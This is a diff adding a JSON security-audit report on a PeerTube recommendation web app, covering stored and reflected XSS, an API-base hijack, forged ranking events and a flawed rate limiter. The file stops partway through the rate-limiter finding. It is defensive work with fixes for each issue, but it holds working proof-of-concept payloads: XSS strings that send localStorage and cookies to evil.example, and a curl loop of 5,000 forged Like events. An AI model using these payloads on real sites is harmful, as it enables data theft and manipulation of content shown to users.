@@ -1,0 +1,776 @@
+[
+  {
+    "verdict": "confirmed",
+    "title": "Stored cross-site scripting on the channels page via unescaped channel_url attribute",
+    "description": "renderTable in client/frontend/src/pages/channels/index.ts builds each table row with a template literal assigned to innerHTML. Every interpolation in that template is passed through the module's escapeHtml helper except the href value: `<a class=\"channel-name\" href=\"${url}\" target=\"_blank\" rel=\"noreferrer\">`. The value is channels.channel_url, which the crawler copies verbatim from the remote instance's /api/v1/video-channels JSON (toNullableString performs a type check only). An operator of any PeerTube-API-compatible host present in the crawl set can therefore close the href attribute and inject arbitrary attributes or markup into the page. Proof-of-concept channel payload: {\"id\":1,\"name\":\"news\",\"displayName\":\"News\",\"url\":\"x\\\" onmouseover=\\\"fetch('https://evil.example/?l='+localStorage.getItem('localLikes:v1'))\\\" data-z=\\\"\"}. After the next crawl cycle the channels page renders <a class=\"channel-name\" href=\"x\" onmouseover=\"fetch(...)\" data-z=\"\" ...>News</a> and the handler fires on hover; a \"><img src=x onerror=...> payload fires with no interaction. No Content-Security-Policy exists anywhere in the application to contain the injection.",
+    "root_cause": "renderTable in client/frontend/src/pages/channels/index.ts does not pass the channel URL through escapeHtml (or validate its scheme) before interpolating it into an href attribute, allowing a remote instance to inject arbitrary HTML attributes and script into the page.",
+    "intended_behavior": "The channels table should display crawled channel metadata as inert content: the channel name links to the channel's page on its home instance, and every value originating from a third-party instance is HTML-escaped before it reaches innerHTML, exactly as the sibling label, instance_domain and avatar_url interpolations in the same template already are.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "engine/crawler/src/channels-worker.ts",
+        "line": 323,
+        "scope": "crawlInstanceChannels",
+        "description": "channelUrl is set to toNullableString(channel.url), an arbitrary string taken from the remote instance's /api/v1/video-channels JSON response."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/crawler/src/channels-worker.ts",
+        "line": 516,
+        "scope": "toNullableString",
+        "description": "Returns the value unchanged when it is a non-empty string; performs no scheme, character or length validation."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/crawler/src/db.ts",
+        "line": 771,
+        "scope": "constructor",
+        "description": "The ChannelStore prepared INSERT ... ON CONFLICT statement persists the value into the channels.channel_url column."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/server/data/channels.py",
+        "line": 133,
+        "scope": "fetch_channels",
+        "description": "The stored value is selected and returned unmodified as the channel_url key of each row dict."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/server/api/handlers/similar.py",
+        "line": 317,
+        "scope": "do_GET",
+        "description": "The /api/channels handler calls fetch_channels and serializes the rows to JSON for the caller."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 275,
+        "scope": "_handle_engine_read_proxy_get",
+        "description": "The Client backend gateway relays the Engine's /api/channels response bytes to the browser verbatim."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/pages/channels/index.ts",
+        "line": 323,
+        "scope": "channelUrl",
+        "description": "Returns row.channel_url verbatim when present, with no scheme or content check."
+      },
+      {
+        "kind": "sink",
+        "file": "client/frontend/src/pages/channels/index.ts",
+        "line": 277,
+        "scope": "renderTable",
+        "description": "Interpolates the value directly into an href attribute inside a template literal that is assigned to body.innerHTML at line 259, without calling escapeHtml."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None. The channels page and the /api/channels route are anonymous."
+      },
+      {
+        "kind": "third_party_dependency",
+        "description": "The attacker must control a PeerTube-API-compatible host that is in the crawl set. Hosts are taken from the openly self-registered public index at https://instances.joinpeertube.org/api/v1/instances/hosts (engine/server/db/jobs/sync-whitelist.py:29)."
+      },
+      {
+        "kind": "timing_dependency",
+        "description": "A crawl cycle must run after the payload is planted for the value to reach channels.channel_url."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "An onmouseover payload requires the victim to hover the row; an injected <img src=x onerror=...> requires no interaction beyond loading /channels.html."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "An unauthenticated third party who operates a PeerTube-compatible instance listed on the public joinpeertube index, targeting every visitor of the deployment's channels page.",
+      "payloads": [
+        "{\"total\":1,\"data\":[{\"id\":1,\"name\":\"news\",\"displayName\":\"News\",\"url\":\"x\\\" onmouseover=\\\"fetch('https://evil.example/?l='+localStorage.getItem('localLikes:v1'))\\\" data-z=\\\"\",\"followersCount\":9000}]}",
+        "{\"total\":1,\"data\":[{\"id\":1,\"name\":\"news\",\"displayName\":\"News\",\"url\":\"x\\\"><img src=x onerror=fetch('https://evil.example/?c='+document.cookie)>\",\"followersCount\":9000}]}"
+      ],
+      "instructions": [
+        "Stand up a host that answers PeerTube's /api/v1/config, /api/v1/video-channels and /api/v1/videos endpoints, and get it listed on instances.joinpeertube.org so the whitelist sync job picks it up.",
+        "Serve the payload above as the url field of a channel in the /api/v1/video-channels response, keeping the channel's derived host equal to the serving host so extractChannelHost does not skip the row.",
+        "Wait for the target deployment's crawl/updater cycle to store the channel.",
+        "Send a victim to https://<site>/channels.html, or simply wait for organic traffic to the page.",
+        "Receive the exfiltrated localStorage like history on the attacker-controlled collector."
+      ],
+      "expected_result": "The rendered DOM contains attacker-controlled attributes on the channel anchor (verifiable with document.querySelector('.channel-name').outerHTML), and the injected JavaScript executes in the site's origin, sending the victim's localLikes:v1 value to the attacker's host."
+    },
+    "remediation": {
+      "strategy": "Escape the URL at the sink and validate its scheme, and additionally reject non-http(s) URLs at crawl time so the hostile value never enters the database. Add a Content-Security-Policy so a future escaping slip is not immediately exploitable.",
+      "code_changes": [
+        {
+          "file_name": "client/frontend/src/pages/channels/index.ts",
+          "fixed_code": "function safeExternalUrl(value: string) {\n  return /^https?:\\/\\//i.test(value) ? value : \"#\";\n}\n\n// in renderTable:\nconst url = safeExternalUrl(channelUrl(row));\n// ...\n`<a class=\"channel-name\" href=\"${escapeHtml(url)}\" target=\"_blank\" rel=\"noreferrer\">${escapeHtml(label)}</a>`"
+        },
+        {
+          "file_name": "engine/crawler/src/channels-worker.ts",
+          "fixed_code": "function toNullableHttpUrl(value: unknown): string | null {\n  if (typeof value !== \"string\" || value.length === 0) return null;\n  try {\n    const parsed = new URL(value);\n    return parsed.protocol === \"https:\" || parsed.protocol === \"http:\" ? value : null;\n  } catch {\n    return null;\n  }\n}\n\n// in crawlInstanceChannels:\nchannelUrl: toNullableHttpUrl(channel.url),"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "No authentication is needed, but the attacker must run a host that gets listed on the public joinpeertube index and must wait for a crawl cycle. Listing is open self-registration, so the barrier is low but non-zero."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Arbitrary JavaScript in the application origin for every visitor of the channels page: exfiltration of the stored viewing history, forged same-origin calls to the unauthenticated write endpoints, and full page rewrite for phishing. No CSP limits it."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Every step was read in source. The sink is unambiguous - the missing escapeHtml call is visible next to sibling interpolations that have it - and the crawler's lack of validation on channel.url was confirmed in toNullableString. Not executed against a live deployment because no crawled dataset or browser was available."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Reflected cross-site scripting: the embed query parameter is assigned to an unsandboxed iframe src",
+    "description": "The video page reads several display fallbacks from the query string, among them fallback.embed = params.get(\"embed\"). loadVideo assigns that value straight to the player iframe's src with no scheme validation: `if (embedEl && embed) embedEl.src = embed;`. The fallback is used whenever fetchVideoMetadata returns null, which happens whenever resolveVideoSource cannot produce both a host and an id - precisely the case for a link that carries only an embed parameter, because new URL(\"javascript:...\") parses with an empty host. The iframe at client/frontend/video-page.html:25 carries no sandbox attribute and no document in the project sets a Content-Security-Policy. Navigating an iframe to a javascript: URL executes the script in the origin of the initiating document: the frame's initial about:blank inherits the parent origin, and the HTML standard's javascript: URL handling proceeds when the initiator is same origin-domain with the target's active document, which holds here because the parent page itself performs the assignment.",
+    "root_cause": "loadVideo in client/frontend/src/pages/video-page/index.ts does not validate that the embed URL uses the https scheme before assigning it to the player iframe's src, allowing a javascript: URL supplied in the query string to execute in the page's origin.",
+    "intended_behavior": "The player iframe should show the PeerTube embed for the requested video. The embed query parameter exists as a display fallback so a feed card can pass along the embed URL it already knows (videos/index.ts:402), and it is only ever expected to hold an absolute https URL pointing at the video's home instance.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "client/frontend/src/pages/video-page/index.ts",
+        "line": 45,
+        "scope": "module",
+        "description": "fallback.embed is read directly from the page's query string via params.get(\"embed\")."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/pages/video-page/index.ts",
+        "line": 535,
+        "scope": "resolveVideoSource",
+        "description": "With no id or host parameter and an embed value that new URL() parses to an empty host, both host and id are empty strings and the function returns null."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/pages/video-page/index.ts",
+        "line": 344,
+        "scope": "fetchVideoMetadata",
+        "description": "Returns null when the source has no host or id, so no server metadata is fetched and metadata stays null."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/pages/video-page/index.ts",
+        "line": 88,
+        "scope": "loadVideo",
+        "description": "const embed = metadata?.embedUrl ?? fallback.embed resolves to the attacker-supplied query parameter."
+      },
+      {
+        "kind": "sink",
+        "file": "client/frontend/src/pages/video-page/index.ts",
+        "line": 200,
+        "scope": "loadVideo",
+        "description": "embedEl.src = embed assigns the unvalidated value to the src of the iframe declared at client/frontend/video-page.html:25, which has no sandbox attribute."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None. The video page is anonymous and served as a static asset."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "The victim must open the attacker's link. No click inside the page is required."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "Applies to a production build. In dev, client/frontend/scripts/dev.mjs sets VITE_CLIENT_API_BASE but that affects the API base only, not this sink; the sink is unconditional."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "An unauthenticated remote attacker who can get a victim to follow a link to the legitimate site.",
+      "payloads": [
+        "https://<site>/video-page.html?embed=javascript:fetch('https://evil.example/?l='%2BencodeURIComponent(localStorage.getItem('localLikes:v1')))",
+        "https://<site>/video-page.html?embed=javascript:document.body.innerHTML='<h1>Sign in to continue</h1>'"
+      ],
+      "instructions": [
+        "Craft the link above, omitting the id, host and url parameters so that resolveVideoSource returns null and the embed fallback is used.",
+        "Deliver the link to the victim by any means (chat, email, a post on a federated instance).",
+        "The victim opens the page; loadVideo assigns the javascript: URL to the player iframe's src.",
+        "Collect the exfiltrated data on the attacker-controlled host."
+      ],
+      "expected_result": "The javascript: URL is evaluated with the site's origin as soon as the page loads - observable as the request arriving at evil.example carrying the victim's localLikes:v1 value, or as document.domain in an alert() variant of the payload."
+    },
+    "remediation": {
+      "strategy": "Allowlist the URL scheme before assigning it to the iframe, add a sandbox attribute to the player frame, and ship a Content-Security-Policy that forbids inline and javascript: script execution.",
+      "code_changes": [
+        {
+          "file_name": "client/frontend/src/pages/video-page/index.ts",
+          "fixed_code": "if (embedEl && /^https:\\/\\//i.test(embed)) {\n  embedEl.src = embed;\n}"
+        },
+        {
+          "file_name": "client/frontend/video-page.html",
+          "fixed_code": "<iframe\n  id=\"video-embed\"\n  title=\"Video player\"\n  sandbox=\"allow-scripts allow-same-origin allow-fullscreen allow-presentation\"\n  allowfullscreen\n  referrerpolicy=\"no-referrer\"\n></iframe>"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "A single crafted URL, no preconditions beyond the victim opening it, and no interaction inside the page."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Arbitrary script in the application origin: read the stored viewing history, issue same-origin requests to the unauthenticated write endpoints, and rewrite the page for phishing on a trusted domain."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "medium",
+      "reason": "All source facts were verified: the unvalidated assignment, the reachable metadata === null branch, the absent sandbox attribute and the absence of any CSP. The final execution step relies on documented browser handling of javascript: URLs in iframe src rather than an executed proof of concept, because no browser was available in this environment."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "javascript: URLs from crawled instance data and query parameters reach href sinks",
+    "description": "The feed cards and the video page render channel and original-video links with escapeHtml applied to the URL. escapeHtml only replaces & < > \" ', so it prevents an attribute breakout but leaves the URL scheme untouched: javascript:alert(1) passes through intact and becomes a working href. Two sources feed these sinks. First, crawled data: videos.channel_url and videos.video_url are stored verbatim from the remote instance's JSON in toVideoRow, and both channel_url and video_url are part of STABLE_VIDEO_FIELDS, so they are returned to the browser in every feed and similar response. Second, the video page's own query parameters channelUrl and url, which are used whenever the corresponding metadata field is absent. In both cases the victim must click the link for the script to run, which is what separates this from the no-click sinks in the other two XSS findings.",
+    "root_cause": "renderCard in client/frontend/src/pages/videos/index.ts and loadVideo in client/frontend/src/pages/video-page/index.ts do not restrict URL schemes to http(s) before emitting href attributes, allowing javascript: URLs from crawled instance metadata or from query parameters to execute on click.",
+    "intended_behavior": "Channel and original-video links should navigate the user to the corresponding page on the video's home instance. Every such URL is either constructed by the application from an instance hostname or taken from the instance's own metadata, and is expected to be an absolute http(s) URL.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "engine/crawler/src/videos-worker.ts",
+        "line": 658,
+        "scope": "toVideoRow",
+        "description": "channelUrl is taken verbatim from the remote instance's channel.url field via toNullableString, with no scheme validation; videoUrl at line 660 is taken the same way."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/server/api/handlers/similar.py",
+        "line": 74,
+        "scope": "stable_video_row",
+        "description": "channel_url (line 74) and video_url (line 77) are members of STABLE_VIDEO_FIELDS, so the raw crawled strings are included in every recommendation and similar-video response."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/pages/videos/index.ts",
+        "line": 476,
+        "scope": "channelUrl",
+        "description": "Returns row.channel_url verbatim when present, falling back to a constructed https URL only when it is absent."
+      },
+      {
+        "kind": "sink",
+        "file": "client/frontend/src/pages/videos/index.ts",
+        "line": 364,
+        "scope": "renderCard",
+        "description": "Emits <a class=\"channel-link\" href=\"${escapeHtml(channelHref)}\"> into markup assigned to cards.innerHTML; escapeHtml neutralises quoting but not the javascript: scheme."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "The victim must click the channel name or the original-video link."
+      },
+      {
+        "kind": "third_party_dependency",
+        "description": "For the stored variant, the attacker must control a crawled instance. The query-parameter variant (video-page/index.ts:44 channelUrl and :46 url) needs only a crafted link."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Either an operator of a crawled instance poisoning stored metadata, or a remote attacker sending a crafted video-page link.",
+      "payloads": [
+        "https://<site>/video-page.html?channel=Official%20Channel&channelUrl=javascript:fetch('https://evil.example/?l='%2BlocalStorage.getItem('localLikes:v1'))",
+        "{\"uuid\":\"...\",\"name\":\"Cute cats\",\"channel\":{\"name\":\"cats\",\"url\":\"javascript:fetch('https://evil.example/?l='+localStorage.getItem('localLikes:v1'))\"}}"
+      ],
+      "instructions": [
+        "For the reflected variant: send the crafted video-page link, which renders a channel link labelled with the attacker's chosen text.",
+        "For the stored variant: serve the payload as channel.url from a crawled instance's /api/v1/videos response and wait for the crawl cycle.",
+        "The victim clicks the channel name shown under the player or on a feed card.",
+        "The javascript: URL is executed by the click navigation in the site's origin."
+      ],
+      "expected_result": "Clicking the channel link runs the attacker's script in the site origin instead of navigating; the exfiltration request arrives at the attacker's collector."
+    },
+    "remediation": {
+      "strategy": "Introduce one shared helper that returns '#' for any URL whose scheme is not http or https, and apply it at every href and src assignment in the three page modules; additionally reject non-http(s) URLs in the crawler's toVideoRow.",
+      "code_changes": [
+        {
+          "file_name": "client/frontend/src/pages/videos/index.ts",
+          "fixed_code": "function safeExternalUrl(value: string) {\n  return /^https?:\\/\\//i.test(value) ? value : \"#\";\n}\n\n// in renderCard:\nconst channelHref = safeExternalUrl(channelUrl(row));"
+        },
+        {
+          "file_name": "client/frontend/src/pages/video-page/index.ts",
+          "fixed_code": "const channelUrl = safeExternalUrl(metadata?.channelUrl || fallback.channelUrl);\nconst original = safeExternalUrl(metadata?.originalUrl ?? fallback.url);"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "The reflected variant needs only a link, but the payload only fires if the victim clicks the channel link on the page they were sent to."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Script execution in the application origin with the same primitives as the other XSS findings once the click happens."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "escapeHtml's character set was read in source and clearly does not touch schemes; the crawler's raw storage of channel.url and the presence of channel_url in STABLE_VIDEO_FIELDS were both verified. Click-to-execute behaviour of javascript: hrefs is standard and uncontroversial."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "API base is overridable by the api query parameter, redirecting feed traffic and the user's like history to an attacker origin",
+    "description": "resolveClientApiBase accepts any candidate whose string form starts with the four characters \"http\", including http://evil.example. The candidate comes from the api query parameter via parseSimilarQuery. The build-time environment variable VITE_CLIENT_API_BASE takes precedence, and npm run dev sets it (client/frontend/scripts/dev.mjs:104), but the production build procedure in DEPLOYMENT.md does not set it, so in a deployed build the query parameter wins. fetchSimilarVideosPayload then POSTs the visitor's stored likes to the attacker's origin and renders whatever rows come back, and videoPageUrl copies the api parameter into every card link so the override persists across in-app navigation. The same resolver backs sendUserAction, fetchUserProfileLikes and resetUserProfileLikes.",
+    "root_cause": "normalizeApiBase in client/frontend/src/data/api-base.ts does not restrict the caller-supplied API base to the application's own origin (or an allowlist), allowing a query parameter to redirect all API traffic - including the user's like history - to an attacker-controlled host.",
+    "intended_behavior": "The API base should default to the page's own origin, with an override available for local development so a developer can point a statically served frontend at a backend on another port. It is not meant to be a user-facing runtime control on a deployed site.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "client/frontend/src/data/videos.ts",
+        "line": 29,
+        "scope": "parseSimilarQuery",
+        "description": "apiBase is read from the page's api query parameter."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/data/api-base.ts",
+        "line": 12,
+        "scope": "normalizeApiBase",
+        "description": "Accepts any value whose trimmed form starts with the literal \"http\", with no origin comparison or allowlist."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/data/api-base.ts",
+        "line": 23,
+        "scope": "resolveClientApiBase",
+        "description": "Returns the caller-supplied base when the build-time VITE_CLIENT_API_BASE is unset, which is the case for the production build described in DEPLOYMENT.md."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/frontend/src/data/videos.ts",
+        "line": 47,
+        "scope": "buildSimilarUrl",
+        "description": "Constructs new URL(\"/recommendations\", apiBase), pointing the request at the attacker's origin."
+      },
+      {
+        "kind": "sink",
+        "file": "client/frontend/src/data/videos.ts",
+        "line": 80,
+        "scope": "fetchSimilarVideosPayload",
+        "description": "POSTs {likes: getRandomLikes()} to the attacker-controlled URL and returns the parsed response, which the page then renders as feed rows."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "VITE_CLIENT_API_BASE must be unset at build time, which is the case for the documented production build (DEPLOYMENT.md:63-71). If an operator sets it, the override is ignored."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "The victim must open the attacker's link to the legitimate site."
+      },
+      {
+        "kind": "authentication_level",
+        "description": "None."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "A remote attacker who can get a victim to follow a link to the legitimate site and who controls a host that can answer CORS-enabled POST /recommendations requests.",
+      "payloads": [
+        "https://<site>/videos.html?api=https://evil.example",
+        "HTTP/1.1 200 OK\\r\\nAccess-Control-Allow-Origin: *\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"rows\":[{\"title\":\"Breaking news\",\"instance_domain\":\"evil.example\",\"video_id\":\"1\",\"channel_url\":\"javascript:alert(document.domain)\",\"channel_name\":\"News\"}],\"generatedAt\":0,\"count\":1}"
+      ],
+      "instructions": [
+        "Stand up a host that answers POST /recommendations with permissive CORS headers and logs the request body.",
+        "Send the victim the link above.",
+        "The page POSTs the victim's stored likes to the attacker's host; record them.",
+        "Answer with attacker-chosen rows, which the page renders as genuine feed cards on the real origin - including their channel_url values, which chains into the href sink finding."
+      ],
+      "expected_result": "The attacker's server logs a POST /recommendations request containing the victim's like list, and the victim's browser displays attacker-controlled video cards on the legitimate domain."
+    },
+    "remediation": {
+      "strategy": "Honour the api override only in development builds, or validate it against an allowlist of permitted origins.",
+      "code_changes": [
+        {
+          "file_name": "client/frontend/src/data/api-base.ts",
+          "fixed_code": "export function resolveClientApiBase(value?: string | null): string {\n  const envBase = normalizeApiBase(import.meta.env.VITE_CLIENT_API_BASE);\n  if (envBase) {\n    return envBase;\n  }\n  if (import.meta.env.DEV) {\n    const direct = normalizeApiBase(value);\n    if (direct) {\n      return direct;\n    }\n  }\n  return DEFAULT_CLIENT_API_BASE;\n}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "One link and an attacker-controlled endpoint, but it depends on the deployment being built without VITE_CLIENT_API_BASE - which is what the documented build procedure produces."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "Discloses the visitor's viewing history to the attacker and gives the attacker control of the content rendered on the legitimate origin, which also delivers the javascript: href sink."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The resolver, the parameter plumbing and the POST body were all read in source. The one inference is that operators follow DEPLOYMENT.md and do not set VITE_CLIENT_API_BASE; the repository contains no build script or env file that sets it for production."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Unauthenticated manipulation of global recommendation ranking through the client event publish endpoint",
+    "description": "POST /client/events/publish on the Client backend accepts an arbitrary JSON object from any browser, fills in a fresh event_id when one is absent - which defeats the Engine's idempotency key - and forwards it unchanged to the Engine's /internal/events/ingest bridge. The Engine validates only that event_type is one of Like, UndoLike or Comment and that object.video_uuid and object.instance_domain are non-empty strings; it does not check that the video exists, that the actor is real, or that the caller is the Client service. Each accepted Like adds 1.0 to interaction_signals.signal_score for the named video, and fetch_popular_videos orders the global popular candidate pool by (v.popularity + COALESCE(sig.signal_score, 0)) DESC. Since popularity is (views + 2*likes)/(1 + age_days/30) - typically two or three digits for an ordinary video - a few thousand posted events place any chosen video at the top of that pool, which supplies 10 percent of the default home mix and 20 to 40 percent of the guest mix. Every accepted event also inserts a permanent row into interaction_raw_events, which has no retention or pruning.",
+    "root_cause": "_handle_client_publish_event in client/backend/server.py does not authenticate the caller or validate the event payload before forwarding it to the Engine's bridge ingest, allowing any anonymous browser to write arbitrary interaction signals that drive the global recommendation ranking.",
+    "intended_behavior": "The bridge is a temporary internal transport: the Client backend normalises a real user action (a like recorded through /api/user-action, after the video identity has been resolved against the Engine) into an event and publishes it to the Engine, which aggregates genuine engagement into ranking signals. Events are meant to originate from the Client's own normalisation path, and the idempotency key exists so a replayed event does not count twice.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "client/backend/server.py",
+        "line": 245,
+        "scope": "do_POST",
+        "description": "POST /client/events/publish is routed after a rate-limit check only; the service implements no authentication."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 662,
+        "scope": "_handle_client_publish_event",
+        "description": "Accepts any JSON object and assigns a fresh event_id of the form client-<uuid4> when the caller omits one, so every replay is treated as a new event."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 675,
+        "scope": "_publish_to_engine_bridge",
+        "description": "POSTs the body unchanged to {engine_ingest_base}/internal/events/ingest."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/server/api/handlers/internal_events.py",
+        "line": 34,
+        "scope": "handle_internal_events_ingest",
+        "description": "Passes each event to ingest_interaction_event with no caller authentication; the route is enabled whenever ENGINE_INGEST_MODE is bridge, which is the default and what the systemd unit sets."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/server/data/interaction_events.py",
+        "line": 136,
+        "scope": "normalize_event_payload",
+        "description": "Validates only the event type enum and the presence of object.video_uuid and object.instance_domain; it never checks that the video exists or that the actor is authentic."
+      },
+      {
+        "kind": "propagation",
+        "file": "engine/server/data/interaction_events.py",
+        "line": 107,
+        "scope": "ingest_interaction_event",
+        "description": "Upserts interaction_signals, adding the per-type delta (+1.0 for Like) to signal_score for the named (video_uuid, instance_domain) pair."
+      },
+      {
+        "kind": "sink",
+        "file": "engine/server/data/random_videos.py",
+        "line": 247,
+        "scope": "fetch_popular_videos",
+        "description": "Orders the global popular candidate pool by (v.popularity + COALESCE(sig.signal_score, 0)) DESC, so the injected score directly determines what every visitor is shown."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "None. The endpoint is anonymous and CORS-open."
+      },
+      {
+        "kind": "data_state",
+        "description": "To be promoted in the feed the targeted video must already exist in the Engine's videos table with an embedding; the signal row itself can be created for any uuid/host pair."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "ENGINE_INGEST_MODE must be bridge, which is the default in server_config.py and is set explicitly by engine/install-engine-service.sh."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Any anonymous client that can reach the Client backend, aiming to promote chosen content into every visitor's feed or to inflate the Engine database.",
+      "payloads": [
+        "POST /client/events/publish HTTP/1.1\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"event_type\":\"Like\",\"actor_id\":\"a\",\"object\":{\"video_uuid\":\"9f9c1f0e-0000-4000-8000-000000000000\",\"instance_domain\":\"evil.example\"}}",
+        "for i in $(seq 1 5000); do curl -s -o /dev/null -X POST https://<site>/client/events/publish -H 'content-type: application/json' -d '{\"event_type\":\"Like\",\"actor_id\":\"a\",\"object\":{\"video_uuid\":\"<uuid>\",\"instance_domain\":\"<host>\"}}'; done"
+      ],
+      "instructions": [
+        "Pick a target video that the crawler has already indexed and note its video_uuid and instance_domain (both are returned in any /recommendations response).",
+        "POST the Like event above repeatedly, omitting event_id so the Client backend mints a unique one each time and the Engine's ON CONFLICT DO NOTHING dedupe never triggers.",
+        "Continue until the accumulated signal_score exceeds the popularity of the current top entries (a few thousand requests for a typical corpus).",
+        "Request /recommendations as an ordinary visitor and observe the promoted video in the popular slots."
+      ],
+      "expected_result": "The targeted video appears at the top of the popular candidate layer for every visitor, and interaction_raw_events grows by one permanent row per request."
+    },
+    "remediation": {
+      "strategy": "Remove the browser-facing passthrough or authenticate the Client-to-Engine bridge, make the event identifier deterministic so replays collapse, and bound the influence any single video's injected signal can have on ranking.",
+      "code_changes": [
+        {
+          "file_name": "client/backend/server.py",
+          "fixed_code": "# Derive the identity from the action instead of minting a new one per request,\n# so a replayed event is deduplicated by the Engine's ON CONFLICT clause.\nevent_key = f\"{user_id}:{canonical_host}:{canonical_uuid}:{event_type}\"\nevent_payload[\"event_id\"] = f\"client-{hashlib.sha256(event_key.encode()).hexdigest()}\"\n\n# And drop the unauthenticated passthrough route entirely:\n# if url.path == \"/client/events/publish\": ... -> removed"
+        },
+        {
+          "file_name": "engine/server/api/handlers/internal_events.py",
+          "fixed_code": "bridge_token = os.environ.get(\"ENGINE_BRIDGE_TOKEN\", \"\")\nprovided = handler.headers.get(\"x-bridge-token\", \"\")\nif not bridge_token or not hmac.compare_digest(bridge_token, provided):\n    respond_json(handler, 401, {\"error\": \"Unauthorized\"})\n    return True"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "A single unauthenticated HTTP request, repeatable; the only obstacle is a rate limiter that is itself defective (see the rate-limiter finding)."
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "No data is disclosed or destroyed, but an anonymous party controls what every visitor of the deployment sees in the popular slots and can grow the Engine database without bound."
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "The full path from the public route to the ORDER BY expression was read in source, including the event_id minting that defeats deduplication. The number of requests needed to dominate the ordering is an estimate from the popularity formula, not a measurement against a real dataset."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "Rate limiter keyed on the TCP peer address collapses to a single shared bucket behind a reverse proxy",
+    "description": "Both services parse X-Forwarded-For and X-Real-IP, which shows a reverse proxy is the intended deployment, but they use the wrong address in opposite ways. The Client backend's _rate_limit_check keys its limiter on self.client_address[0], the TCP peer - behind a proxy, one constant value for the entire user base. The limiter allows 90 requests per 60 seconds per key, so a single client issuing 90 requests a minute to /recommendations exhausts the shared bucket and every other visitor receives HTTP 429 for the rest of the window. The Engine has the mirror-image defect: its _rate_limit_check keys on _get_client_ip(), which prefers the client-supplied X-Forwarded-For header, so varying that header per request bypasses the limiter entirely. Between them, the deployment has a limiter that throttles legitimate users collectively while not throttling an attacker at all.",
+    "root_cause": "_rate_limit_check in client/backend/server.py keys the rate limiter on the TCP peer address rather than on the forwarded client address from a trusted proxy, causing all users behind the reverse proxy to share one bucket (and, conversely, _rate_limit_check in engine/server/api/handlers/similar.py trusts an unverified X-Forwarded-For header for the same purpose).",
+    "intended_behavior": "The limiter is meant to cap how many requests any one client can make to a given route per minute, so that one abusive client cannot exhaust the service for others. The per-key design (ip plus path) shows per-client isolation was the goal.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "client/backend/server.py",
+        "line": 221,
+        "scope": "do_POST",
+        "description": "Any anonymous POST to /recommendations or /videos/similar enters the rate-limit check before being proxied."
+      },
+      {
+        "kind": "propagation",
+        "file": "client/backend/server.py",
+        "line": 255,
+        "scope": "_rate_limit_check",
+        "description": "ip is taken from self.client_address[0], the TCP peer address, which behind a reverse proxy is the proxy's own address for every user; the X-Forwarded-For value parsed at line 137 is used only for logging."
+      },
+      {
+        "kind": "sink",
+        "file": "client/backend/lib/http_utils.py",
